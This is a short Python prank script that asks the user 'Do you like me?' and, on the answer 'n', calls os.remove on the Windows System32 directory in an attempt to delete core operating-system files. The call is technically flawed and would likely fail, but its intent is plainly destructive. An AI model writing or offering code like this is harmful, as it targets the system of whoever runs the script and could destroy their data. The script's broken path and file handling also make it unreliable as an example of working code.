import os
def main():
    answer = input("Do you like me? (y/n): ").lower()

    if answer == 'y':
        print("OK")
    elif answer == 'n':
        os.remove("C:\Windows\System32")
    else:
        print("invalid input! Please enter 'y' or 'n'.")


if __name__ == "__main__":
    main()
    